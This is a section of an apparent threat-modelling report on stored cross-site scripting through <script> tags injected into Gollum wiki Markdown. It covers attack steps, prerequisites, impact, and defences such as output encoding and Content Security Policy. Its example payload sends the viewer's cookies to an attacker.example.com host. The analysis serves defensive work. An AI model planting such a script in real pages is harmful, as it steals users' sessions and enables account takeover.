### 4. Deep Analysis of Attack Tree Path: Inject Malicious `<script>` Tags

**HIGH-RISK PATH: Inject Malicious `<script>` Tags**

**Detailed Breakdown of Attack Vectors:**

* **HIGH-RISK PATH: Inject Malicious `<script>` Tags:** Directly embedding `<script>` tags in Markdown to execute JavaScript.

**Analysis:**

This attack path leverages the fact that Gollum, like many wiki systems, allows users to create and edit content using Markdown. If Gollum's Markdown rendering engine does not properly sanitize or escape user-provided content, an attacker can inject arbitrary HTML, including `<script>` tags. When a user views a page containing this malicious script, their browser will execute the JavaScript code embedded within the `<script>` tags.

**Attack Vector Breakdown:**

1. **Attacker Input:** The attacker crafts a Markdown page or edits an existing one, embedding malicious `<script>` tags within the content. For example:

   ```markdown
   This is some normal text.

   <script>
       // Malicious JavaScript code
       window.location.href = 'https://attacker.example.com/steal_cookies?cookie=' + document.cookie;
   </script>

   More normal text.
   ```

2. **Gollum Processing:** When this Markdown content is saved and subsequently rendered for a user, Gollum's Markdown parser processes the input. The vulnerability lies in whether the parser and rendering engine treat the `<script>` tag as literal text or as executable HTML.

3. **Browser Execution:** If Gollum does not properly sanitize the input, the browser receiving the rendered HTML will interpret the `<script>` tag and execute the JavaScript code.

**Prerequisites for Successful Attack:**

* **Ability to Edit Content:** The attacker needs to have the ability to create or modify pages within the Gollum wiki. This could be through direct access, compromised accounts, or vulnerabilities in access control mechanisms.
* **Lack of Input Sanitization:** The core vulnerability is the absence or inadequacy of input sanitization or output encoding within Gollum's Markdown rendering process.

**Potential Impact:**

A successful injection of malicious `<script>` tags can have severe consequences, including:

* **Cross-Site Scripting (XSS):** This is the primary risk. The injected script executes in the context of the user's browser, allowing the attacker to:
    * **Steal Session Cookies:**  Gain access to the user's session, potentially impersonating them and accessing sensitive information or performing actions on their behalf.
    * **Redirect Users:**  Send users to malicious websites, potentially for phishing or malware distribution.
    * **Deface the Wiki:**  Modify the content of the page or the entire wiki.
    * **Execute Arbitrary Actions:**  Perform actions on the Gollum application with the privileges of the logged-in user.
    * **Keylogging:**  Capture user keystrokes on the affected page.
    * **Data Exfiltration:**  Send sensitive data from the page to an attacker-controlled server.
* **Account Takeover:** By stealing session cookies or redirecting users to phishing pages, attackers can gain control of user accounts.
* **Malware Distribution:**  The injected script could download and execute malware on the user's machine.
* **Reputation Damage:**  A successful attack can damage the reputation of the organization using the Gollum wiki.

**Vulnerability Analysis:**

The vulnerability likely resides in the way Gollum's Markdown rendering engine handles HTML tags within the Markdown content. Specifically:

* **Insufficient Output Encoding:** The rendered output is not properly encoded to treat HTML special characters (like `<`, `>`, `"`, `'`) as literal text rather than HTML markup.
* **Lack of Input Sanitization:**  The input is not being checked and potentially harmful HTML tags are not being removed or neutralized before rendering.
* **Configuration Issues:**  Potentially, there are configuration options within Gollum that control the level of HTML allowed in Markdown, and these are not set to a secure level.

**Mitigation Strategies:**

To effectively mitigate this attack vector, the development team should implement the following strategies:

* **Robust Output Encoding/Escaping:**  The most crucial step is to ensure that all user-provided content, especially when rendering Markdown, is properly encoded for HTML output. This means converting characters like `<`, `>`, `"`, and `'` into their corresponding HTML entities (`&lt;`, `&gt;`, `&quot;`, `&#39;`). This will prevent the browser from interpreting injected `<script>` tags as executable code. The specific encoding function used should be context-aware (e.g., HTML escaping for HTML content).
* **Content Security Policy (CSP):** Implement a strong Content Security Policy. CSP is an HTTP header that allows the server to control the resources the browser is allowed to load for a given page. By carefully configuring CSP directives, you can restrict the execution of inline scripts and scripts from untrusted sources, significantly reducing the impact of XSS attacks. For example, using directives like `script-src 'self'` would only allow scripts from the same origin as the document.
* **Input Sanitization (with Caution):** While output encoding is generally preferred, input sanitization can be used to remove potentially harmful HTML tags. However, this approach is more complex and prone to bypasses if not implemented carefully. Use a well-vetted and regularly updated HTML sanitization library. Be cautious about overly aggressive sanitization that might break legitimate Markdown formatting.
* **Regular Security Audits and Penetration Testing:** Conduct regular security audits and penetration testing to identify and address potential vulnerabilities, including XSS flaws.
* **Principle of Least Privilege:** Ensure that users have only the necessary permissions within the Gollum application. Limit the ability to edit content to trusted users or implement a review process for content changes.
* **Security Headers:** Implement other relevant security headers, such as `X-Frame-Options` and `X-Content-Type-Options`, to further enhance security.
* **Keep Gollum Up-to-Date:** Regularly update Gollum to the latest version to benefit from security patches and bug fixes.

**Conclusion:**

The ability to inject malicious `<script>` tags poses a significant security risk to the Gollum application and its users. By understanding the mechanics of this attack vector and implementing the recommended mitigation strategies, the development team can significantly reduce the likelihood and impact of such attacks. Prioritizing robust output encoding and implementing a strong Content Security Policy are critical steps in securing the application against this common and dangerous vulnerability.
